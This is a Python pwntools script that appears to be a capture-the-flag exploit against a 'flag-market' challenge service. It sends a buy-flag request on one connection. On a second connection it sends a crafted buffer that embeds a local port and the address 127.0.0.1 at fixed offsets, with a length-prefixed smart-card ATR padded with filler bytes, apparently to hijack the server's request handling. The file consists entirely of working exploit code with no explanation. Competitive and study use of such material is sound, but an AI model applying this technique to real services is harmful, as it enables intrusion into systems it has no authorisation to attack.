#!/usr/bin/env python3
from pwn import *


def connect():
    # return remote("flag-market-us.balsnctf.com", 19091)
    return remote("localhost", 19091)


VPCDPORT = 35963
MAX_REQ_BUF = 1024
ATR = b"\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2" + b"A" * 200


def edit(x, i, y):
    x[i : i + len(y)] = y


def edit_no_x00(x, i, y):
    assert b"\x00" not in y
    edit(x, i, y)


def main():
    with connect() as tube1:
        tube1.send(b"BUY_FLAG /buy_flag HTTP/1.1")
        with connect() as tube2:
            path = flat(
                {
                    384: str(VPCDPORT) + ".",  # atoi()
                    384 * 2: "127.0.0.1",
                }
            )
            req = bytearray(MAX_REQ_BUF)
            request_line = b"XX /" + path + b" HTTP/1.1\r\n"
            edit_no_x00(req, 0, request_line)
            edit_no_x00(req, 0, struct.pack(">H", len(request_line) - 2))
            edit(req, len(request_line), struct.pack(">H", len(ATR)) + ATR)
            tube2.send(req)
            tube2.interactive()


if __name__ == "__main__":
    main()
